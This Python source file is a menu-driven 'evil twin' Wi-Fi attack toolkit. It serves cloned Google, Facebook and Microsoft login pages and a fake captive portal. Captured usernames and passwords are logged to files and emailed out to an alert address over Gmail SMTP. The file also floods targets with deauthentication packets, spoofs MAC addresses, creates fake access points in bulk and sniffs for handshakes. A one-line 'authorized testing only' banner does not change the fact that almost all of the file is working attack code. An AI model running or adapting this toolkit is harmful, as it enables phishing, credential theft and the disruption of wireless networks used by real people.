import os
import sys
import time
import random
import socket
import threading
import subprocess
import smtplib
from http.server import BaseHTTPRequestHandler, HTTPServer
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from colorama import Fore, init, Style

# Initialize colorama
init(autoreset=True)

# ====================== CONFIGURATION ======================
LOG_FILE = "creds.txt"
PHISHING_LOG = "phishing_logs.txt"
PORTAL_PORT = 8080
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_EMAIL = "your_email@gmail.com"
SMTP_PASSWORD = "your_app_password"  # Use app password for Gmail
ALERT_EMAIL = "alert_destination@gmail.com"
DEAUTH_COUNT = 5  # Number of deauth packets to send
STOP_FLAG = False

# ====================== PHISHING TEMPLATES ======================
TEMPLATES = {
    "google": {
        "name": "Google Login",
        "html": """<!DOCTYPE html><html><head><title>Google Security Check</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        .logo{text-align:center;margin-bottom:20px;}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#4285F4;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body><div class="login-box"><div class="logo">
        <svg width="75" height="24" viewBox="0 0 75 24"><g fill="none"><path d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68C70.83 8.09 69.417 7 66.52 7c-3.64 0-6.783 2.902-6.783 7.546 0 4.756 3.152 7.547 6.898 7.547 3.24 0 5.26-1.97 5.26-4.82 0-.28-.03-.5-.09-.7H67.96zm-6.008-5.09c0-1.87 1.147-3.22 2.857-3.22 1.67 0 2.857 1.35 2.857 3.22 0 1.92-1.187 3.22-2.857 3.22-1.71 0-2.857-1.3-2.857-3.22z" fill="#4285F4"/></g></svg>
        </div><h2>Security Check Required</h2><form action="/phish/google" method="post">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify Account</button></form></div></body></html>""",
        "success": """<div style="text-align:center;padding:20px;">
        <h2 style="color:#4285F4;">Security Verification Complete</h2>
        <p>Your account is now secure.</p></div>"""
    },
    "facebook": {
        "name": "Facebook Login",
        "html": """<!DOCTYPE html><html><head><title>Facebook Login</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        .logo{color:#1877F2;text-align:center;font-size:24px;font-weight:bold;margin-bottom:20px;}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#1877F2;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body><div class="login-box"><div class="logo">facebook</div>
        <form action="/phish/facebook" method="post">
        <input type="text" name="email" placeholder="Email or Phone Number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button></form></div></body></html>""",
        "success": """<div style="text-align:center;padding:20px;">
        <h2 style="color:#1877F2;">Login Successful</h2>
        <p>You will be redirected shortly.</p></div>"""
    },
    "microsoft": {
        "name": "Microsoft Account",
        "html": """<!DOCTYPE html><html><head><title>Microsoft Account</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        .logo{text-align:center;margin-bottom:20px;color:#0078D4;}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#0078D4;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body><div class="login-box"><div class="logo">
        <svg width="120" height="23" viewBox="0 0 21 21"><path d="M10.5 20a9.5 9.5 0 1 0 0-19 9.5 9.5 0 0 0 0 19z" fill="#f25022"/><path d="M10.5 20a9.5 9.5 0 1 0 0-19 9.5 9.5 0 0 0 0 19z" fill="#7fba00" transform="rotate(-180 5.25 10.5)"/><path d="M10.5 20a9.5 9.5 0 1 0 0-19 9.5 9.5 0 0 0 0 19z" fill="#00a4ef" transform="rotate(-90 10.5 5.25)"/><path d="M10.5 20a9.5 9.5 0 1 0 0-19 9.5 9.5 0 0 0 0 19z" fill="#ffb900" transform="rotate(90 5.25 15.75)"/></svg>
        </div><h2>Sign In</h2><form action="/phish/microsoft" method="post">
        <input type="email" name="email" placeholder="Email, phone, or Skype" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign In</button></form></div></body></html>""",
        "success": """<div style="text-align:center;padding:20px;">
        <h2 style="color:#0078D4;">Authentication Successful</h2>
        <p>You can now access your account.</p></div>"""
    }
}

# ====================== UTILITY FUNCTIONS ======================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Fore.RED}
   ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄█   ▄█▄    ▄████████ 
  ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀   ███    ███ 
  ███    █▀  ███   ███   ███    ███   ███    █▀    ███▐██▀     ███    █▀  
  ███        ███   ███  ▄███▄▄▄▄██▀  ▄███▄▄▄       ▄█████▀     ▄███▄▄▄     
▀███████████ ███   ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀      ▀▀█████▄    ▀▀███▀▀▀     
         ███ ███   ███ ▀███████████   ███    █▄     ███▐██▄     ███    █▄ 
   ▄█    ███ ███   ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███ 
 ▄████████▀   ▀█   █▀    ███    ███   ██████████   ███   ▀█▀   ██████████ 
                          ███    ███                                      
    {Fore.RESET}{Fore.CYAN}[ Ultimate Evil Twin Wi-Fi Toolkit with Phishing Campaigns ]{Fore.RESET}
    {Fore.YELLOW}⚠ WARNING: For Authorized Security Testing Only! ⚠{Fore.RESET}
    {Fore.BLUE}• Evil Twin Wi-Fi • Credential Harvesting • Phishing Campaigns{Fore.RESET}
    """
    print(banner)

def get_local_ip():
    """Get local IP address for phishing URL"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "YOUR-IP"

# ====================== CREDENTIAL HANDLING ======================
def log_credentials(service, username, password):
    """Log credentials to file and terminal"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {service.upper()} - Username: {username} | Password: {password}\n"
    
    # Save to appropriate log file
    if service.lower() == "wifi":
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
    else:
        with open(PHISHING_LOG, "a") as f:
            f.write(log_entry)
    
    # Print to terminal
    print(f"{Fore.RED}[!] {service.upper()} Credentials Captured:{Fore.RESET}")
    print(f"{Fore.RED}    Username: {username}{Fore.RESET}")
    print(f"{Fore.RED}    Password: {password}{Fore.RESET}\n")

def send_email_alert(service, username, password):
    """Send email alert when credentials are captured"""
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_EMAIL, SMTP_PASSWORD)
            subject = f"ALERT: {service.upper()} Credentials Captured"
            body = f"""
New credentials captured:
- Service: {service}
- Timestamp: {time.strftime("%Y-%m-%d %H:%M:%S")}
- Username: {username}
- Password: {password}

IP: {get_local_ip()}
"""
            message = f"Subject: {subject}\n\n{body}"
            server.sendmail(SMTP_EMAIL, ALERT_EMAIL, message)
        print(f"{Fore.GREEN}[+] Email alert sent successfully{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to send email alert: {e}{Fore.RESET}")

# ====================== PHISHING SERVER ======================
class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_redirect()
        elif self.path.startswith('/template/'):
            self.send_phishing_template()
        elif self.path == '/success':
            self.send_success_page()
        elif self.path == '/wifi':
            self.send_wifi_login()
        else:
            self.send_redirect()
    
    def do_POST(self):
        if self.path.startswith('/phish/'):
            self.handle_phish_submit()
        elif self.path == '/auth':
            self.handle_wifi_login()
    
    def send_redirect(self):
        self.send_response(302)
        self.send_header('Location', '/wifi')
        self.end_headers()
    
    def send_phishing_template(self):
        template = self.path.split('/')[2]
        if template in TEMPLATES:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(TEMPLATES[template]["html"].encode())
        else:
            self.send_error(404)
    
    def send_success_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        success_page = """<!DOCTYPE html><html><head><title>Success</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .success-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);text-align:center;}
        .success{color:#4CAF50;font-size:24px;}</style></head><body>
        <div class="success-box"><div class="success">✓</div>
        <h2>Action Completed</h2><p>Thank you for your cooperation.</p></div></body></html>"""
        self.wfile.write(success_page.encode())
    
    def send_wifi_login(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        login_page = """<!DOCTYPE html><html><head><title>Wi-Fi Login</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#4CAF50;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body><div class="login-box"><h2>Wi-Fi Login Required</h2>
        <form action="/auth" method="post">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Connect</button></form></div></body></html>"""
        self.wfile.write(login_page.encode())
    
    def handle_phish_submit(self):
        template = self.path.split('/')[2]
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Extract credentials based on template
        if template == "google":
            username = post_data.split('email=')[1].split('&')[0]
            password = post_data.split('password=')[1].split('&')[0]
        elif template == "facebook":
            username = post_data.split('email=')[1].split('&')[0]
            password = post_data.split('password=')[1].split('&')[0]
        elif template == "microsoft":
            username = post_data.split('email=')[1].split('&')[0]
            password = post_data.split('password=')[1].split('&')[0]
        
        # Log and alert
        log_credentials(template, username, password)
        threading.Thread(target=send_email_alert, args=(template, username, password)).start()
        
        # Redirect to success page
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()
    
    def handle_wifi_login(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        username = post_data.split('username=')[1].split('&')[0]
        password = post_data.split('password=')[1].split('&')[0]
        
        # Log and alert
        log_credentials("wifi", username, password)
        threading.Thread(target=send_email_alert, args=("Wi-Fi", username, password)).start()
        
        # Redirect to success page
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()

def start_phishing_server():
    server = HTTPServer(('0.0.0.0', PORTAL_PORT), PhishingHandler)
    print(f"{Fore.GREEN}[+] Phishing server running on http://{get_local_ip()}:{PORTAL_PORT}{Fore.RESET}")
    while not STOP_FLAG:
        server.handle_request()

# ====================== WIFI FUNCTIONS ======================
def random_bssid():
    """Generate random MAC address for AP"""
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def spoof_mac(interface="Wi-Fi"):
    """Change MAC address of the interface"""
    new_mac = random_bssid()
    try:
        subprocess.run(f'netsh interface set interface "{interface}" admin=disable', shell=True)
        subprocess.run(f'netsh interface set interface "{interface}" admin=enable', shell=True)
        subprocess.run(f'netsh interface set interface "{interface}" newmac={new_mac}', shell=True)
        print(f"{Fore.GREEN}[+] MAC address spoofed to: {new_mac}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] MAC spoofing failed: {e}{Fore.RESET}")

def enable_wifi_support():
    """Enable Windows hosted network feature"""
    try:
        subprocess.run('netsh wlan set hostednetwork mode=allow', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Hosted network support enabled.{Fore.RESET}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to enable hosted network. Run as Admin!{Fore.RESET}")
        sys.exit(1)

def create_fake_wifi(ssid, password=None):
    """Create a fake Wi-Fi access point"""
    try:
        if password:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" key="{password}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created with password: {password}{Fore.RESET}")
        else:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created (Open Network){Fore.RESET}")
        
        subprocess.run('netsh wlan start hostednetwork', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' is now active!{Fore.RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to create fake Wi-Fi.{Fore.RESET}")
        return False

def stop_fake_wifi():
    """Stop the fake Wi-Fi network"""
    try:
        subprocess.run('netsh wlan stop hostednetwork', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Fake Wi-Fi stopped successfully{Fore.RESET}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to stop fake Wi-Fi{Fore.RESET}")

def bulk_create_from_file(file_path, has_password=False, default_password=None):
    """Create multiple fake networks from a file"""
    if not os.path.exists(file_path):
        print(f"{Fore.RED}[-] File not found: {file_path}{Fore.RESET}")
        return
    
    with open(file_path, 'r') as file:
        ssids = [line.strip() for line in file if line.strip()]
    
    for ssid in ssids:
        if has_password and default_password:
            create_fake_wifi(ssid, default_password)
        else:
            create_fake_wifi(ssid)
        time.sleep(2)

# ====================== ATTACK FUNCTIONS ======================
def deauth_attack(target_bssid, interface="Wi-Fi"):
    """Send deauthentication packets to force reconnection"""
    print(f"{Fore.YELLOW}[*] Starting deauthentication attack on {target_bssid}...{Fore.RESET}")
    pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(pkt, iface=interface, count=DEAUTH_COUNT, inter=0.1, verbose=False)

def start_deauth_thread(target_bssid):
    """Run deauth attack in a background thread"""
    global STOP_FLAG
    STOP_FLAG = False
    while not STOP_FLAG:
        deauth_attack(target_bssid)
        time.sleep(5)  # Send deauth packets every 5 seconds

def stop_deauth_thread():
    """Stop the deauth attack"""
    global STOP_FLAG
    STOP_FLAG = True
    print(f"{Fore.RED}[!] Deauthentication attack stopped.{Fore.RESET}")

def packet_handler(pkt):
    """Handle captured packets for credential monitoring"""
    if pkt.haslayer(EAPOL):
        ssid = pkt.info.decode() if pkt.info else "Unknown"
        print(f"{Fore.RED}[!] Possible password attempt detected on: {ssid}{Fore.RESET}")
        if pkt.haslayer(Raw):
            log_credentials("wifi_handshake", ssid, "EAPOL handshake captured")

def start_monitor_mode():
    """Start monitoring for Wi-Fi handshakes"""
    print(f"{Fore.YELLOW}[*] Starting monitor mode (Ctrl+C to stop)...{Fore.RESET}")
    sniff(iface="Wi-Fi", prn=packet_handler, store=0)

def auto_stop_timer(minutes):
    """Automatically stop the attack after specified minutes"""
    time.sleep(minutes * 60)
    stop_fake_wifi()
    print(f"{Fore.RED}[!] Auto-stopped after {minutes} minutes.{Fore.RESET}")
    os._exit(0)

# ====================== MAIN MENU ======================
def main():
    clear_screen()
    print_banner()
    
    # Check admin privileges
    try:
        subprocess.check_output("net session", shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] This tool requires Administrator privileges!{Fore.RESET}")
        sys.exit(1)
    
    # Start phishing server in background
    phishing_thread = threading.Thread(target=start_phishing_server)
    phishing_thread.daemon = True
    phishing_thread.start()
    
    # Enable Wi-Fi support
    enable_wifi_support()

    while True:
        print(f"\n{Fore.CYAN}Main Menu:{Fore.RESET}")
        print(f"{Fore.CYAN}[1]{Fore.RESET} Create Evil Twin with Captive Portal")
        print(f"{Fore.CYAN}[2]{Fore.RESET} Launch Phishing Campaign")
        print(f"{Fore.CYAN}[3]{Fore.RESET} Bulk Create Fake Networks")
        print(f"{Fore.CYAN}[4]{Fore.RESET} Deauthentication Attack")
        print(f"{Fore.CYAN}[5]{Fore.RESET} Credential Monitor")
        print(f"{Fore.CYAN}[6]{Fore.RESET} Spoof MAC Address")
        print(f"{Fore.CYAN}[7]{Fore.RESET} Auto-Stop Timer")
        print(f"{Fore.CYAN}[8]{Fore.RESET} View Captured Credentials")
        print(f"{Fore.CYAN}[9]{Fore.RESET} Exit")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select an option (1-9): {Fore.RESET}")

        if choice == "1":
            # Evil Twin with Captive Portal
            clear_screen()
            print(f"\n{Fore.CYAN}Evil Twin Setup:{Fore.RESET}")
            ssid = input(f"{Fore.YELLOW}[?] Enter SSID to mimic: {Fore.RESET}")
            has_pass = input(f"{Fore.YELLOW}[?] Add password? (y/n): {Fore.RESET}").lower()
            
            if has_pass == 'y':
                password = input(f"{Fore.YELLOW}[?] Enter fake password: {Fore.RESET}")
                create_fake_wifi(ssid, password)
            else:
                create_fake_wifi(ssid)
            
            print(f"\n{Fore.GREEN}[+] Evil Twin active! Users will see login page at:")
            print(f"{Fore.GREEN}[+] http://{get_local_ip()}:{PORTAL_PORT}/wifi{Fore.RESET}")
            input(f"{Fore.YELLOW}[?] Press Enter to return to menu...{Fore.RESET}")
        
        elif choice == "2":
            # Phishing Campaign
            clear_screen()
            print(f"\n{Fore.CYAN}Available Phishing Templates:{Fore.RESET}")
            for i, (key, val) in enumerate(TEMPLATES.items(), 1):
                print(f"{Fore.CYAN}[{i}]{Fore.RESET} {val['name']}")
            
            try:
                template_choice = int(input(f"{Fore.YELLOW}[?] Select template (1-{len(TEMPLATES)}): {Fore.RESET}")) - 1
                selected_template = list(TEMPLATES.keys())[template_choice]
            except:
                print(f"{Fore.RED}[-] Invalid selection{Fore.RESET}")
                continue
            
            print(f"\n{Fore.GREEN}[+] Phishing URL: http://{get_local_ip()}:{PORTAL_PORT}/template/{selected_template}{Fore.RESET}")
            print(f"{Fore.YELLOW}[*] Waiting for credentials... Press Ctrl+C to stop{Fore.RESET}")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Phishing campaign stopped{Fore.RESET}")
        
        elif choice == "3":
            # Bulk Create Fake Networks
            clear_screen()
            print(f"\n{Fore.CYAN}Bulk Network Creation:{Fore.RESET}")
            file_path = input(f"{Fore.YELLOW}[?] Enter path to SSID list (.txt): {Fore.RESET}")
            has_pass = input(f"{Fore.YELLOW}[?] Use default password for all? (y/n): {Fore.RESET}").lower()
            
            if has_pass == 'y':
                password = input(f"{Fore.YELLOW}[?] Enter default password: {Fore.RESET}")
                bulk_create_from_file(file_path, True, password)
            else:
                bulk_create_from_file(file_path)
            
            input(f"{Fore.YELLOW}[?] Press Enter to return to menu...{Fore.RESET}")
        
        elif choice == "4":
            # Deauthentication Attack
            clear_screen()
            print(f"\n{Fore.CYAN}Deauthentication Attack:{Fore.RESET}")
            target_bssid = input(f"{Fore.YELLOW}[?] Enter target BSSID (MAC): {Fore.RESET}")
            
            deauth_thread = threading.Thread(target=start_deauth_thread, args=(target_bssid,))
            deauth_thread.daemon = True
            deauth_thread.start()
            
            print(f"{Fore.YELLOW}[*] Deauth attack running... Press Enter to stop{Fore.RESET}")
            input()
            stop_deauth_thread()
        
        elif choice == "5":
            # Credential Monitor
            clear_screen()
            print(f"\n{Fore.CYAN}Credential Monitor:{Fore.RESET}")
            print(f"{Fore.YELLOW}[*] Monitoring for Wi-Fi handshakes... Press Ctrl+C to stop{Fore.RESET}")
            
            try:
                start_monitor_mode()
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Monitoring stopped{Fore.RESET}")
        
        elif choice == "6":
            # MAC Spoofing
            clear_screen()
            print(f"\n{Fore.CYAN}MAC Address Spoofing:{Fore.RESET}")
            spoof_mac()
            input(f"{Fore.YELLOW}[?] Press Enter to return to menu...{Fore.RESET}")
        
        elif choice == "7":
            # Auto-Stop Timer
            clear_screen()
            print(f"\n{Fore.CYAN}Auto-Stop Timer:{Fore.RESET}")
            minutes = int(input(f"{Fore.YELLOW}[?] Stop after how many minutes?: {Fore.RESET}"))
            threading.Thread(target=auto_stop_timer, args=(minutes,)).start()
            print(f"{Fore.GREEN}[+] Tool will auto-stop in {minutes} minutes{Fore.RESET}")
        
        elif choice == "8":
            # View Captured Credentials
            clear_screen()
            print(f"\n{Fore.CYAN}Captured Credentials:{Fore.RESET}")
            
            if os.path.exists(LOG_FILE):
                print(f"\n{Fore.YELLOW}Wi-Fi Credentials:{Fore.RESET}")
                with open(LOG_FILE, 'r') as f:
                    print(f.read())
            
            if os.path.exists(PHISHING_LOG):
                print(f"\n{Fore.YELLOW}Phishing Credentials:{Fore.RESET}")
                with open(PHISHING_LOG, 'r') as f:
                    print(f.read())
            
            if not os.path.exists(LOG_FILE) and not os.path.exists(PHISHING_LOG):
                print(f"{Fore.RED}[-] No credentials captured yet{Fore.RESET}")
            
            input(f"{Fore.YELLOW}[?] Press Enter to return to menu...{Fore.RESET}")
        
        elif choice == "9":
            # Exit
            print(f"\n{Fore.RED}[!] Cleaning up and exiting...{Fore.RESET}")
            stop_fake_wifi()
            sys.exit(0)
        
        else:
            print(f"{Fore.RED}[-] Invalid choice!{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Shutting down...{Fore.RESET}")
        stop_fake_wifi()
        sys.exit(0)
